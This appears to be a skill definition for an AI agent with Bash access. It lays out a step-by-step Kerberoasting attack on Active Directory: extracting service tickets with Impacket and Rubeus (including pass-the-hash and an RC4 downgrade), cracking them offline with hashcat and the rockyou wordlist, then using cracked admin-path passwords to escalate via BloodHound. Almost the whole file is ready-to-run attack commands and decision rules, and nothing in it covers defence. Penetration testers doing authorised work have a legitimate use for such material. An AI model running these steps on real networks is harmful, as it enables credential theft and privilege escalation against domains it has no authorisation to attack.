---
name: kerberoasting
description: "SPN-based Kerberos TGS ticket extraction and offline cracking"
allowed-tools: Bash
metadata:
  subdomain: active-directory
  mitre_attack: T1558.003
  when_to_use: "kerberoast, spn, service principal, tgs, hashcat, GetUserSPNs"
  tags: active-directory, kerberos, credential-access
---

# Kerberoasting — TGS Ticket Extraction & Offline Cracking

Request TGS tickets for accounts with registered SPNs, then crack offline. The ticket is encrypted with the service account's password hash — weak passwords fall to dictionary attacks.

## 1. Enumerate & Extract

**Impacket (Linux)**
```bash
# Request all kerberoastable TGS tickets
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# Pass-the-hash
impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# Target a specific SPN user
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request-user '<SPN_USER>' -outputfile kerberoast_target.txt
```

**Rubeus (Windows)**
```powershell
# All SPNs
Rubeus.exe kerberoast /outfile:C:\workspace\kerberoast_hashes.txt

# RC4 downgrade — easier to crack, noisier
Rubeus.exe kerberoast /rc4opsec /outfile:C:\workspace\kerberoast_rc4.txt

# AES — stealthier, harder to crack
Rubeus.exe kerberoast /aes /outfile:C:\workspace\kerberoast_aes.txt
```

## 2. Classify Hash

```python
# Identify hash type and recommended hashcat mode
kerberos_classify("$krb5tgs$23$*svc_sql$CORP.LOCAL$...")
```

Returns hashcat mode (13100 for RC4 etype 23, 19700 for AES etype 17/18) and cracking priority.

## 3. Crack Offline

```bash
# RC4 TGS-REP (etype 23) — mode 13100
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o kerberoast_cracked.txt

# AES TGS tickets (etype 17/18) — mode 19700
hashcat -m 19700 kerberoast_aes_hashes.txt /usr/share/wordlists/rockyou.txt -o kerberoast_aes_cracked.txt
```

## 4. Prioritization

| Factor | Priority |
|--------|----------|
| RC4 etype 23 hash | High — fast to crack |
| AES etype 17/18 hash | Lower — much slower, try RC4 first |
| SPN user in Domain Admins path (BloodHound) | Critical — crack this first |
| SPN user with `adminCount=1` | Critical — likely high-privilege |
| SPN on machine account | Skip — machine passwords are 120+ char random |

## 5. Decision Gates

| Condition | Action |
|-----------|--------|
| RC4 hashes available | Crack immediately with hashcat -m 13100 |
| Only AES hashes | Attempt with larger wordlists + rules; consider targeted roast with `/rc4opsec` |
| Cracked password for admin-path user | Authenticate and escalate via BloodHound path |
| No hashes crack | Move to AS-REP roasting or other attack vector |

## Anti-Patterns
- Cracking AES before trying RC4 downgrade — always request RC4 etype first.
- Roasting machine accounts — their passwords are uncrackable random strings.
- Attempting online brute-force instead of offline cracking — Kerberoasting is offline by design.
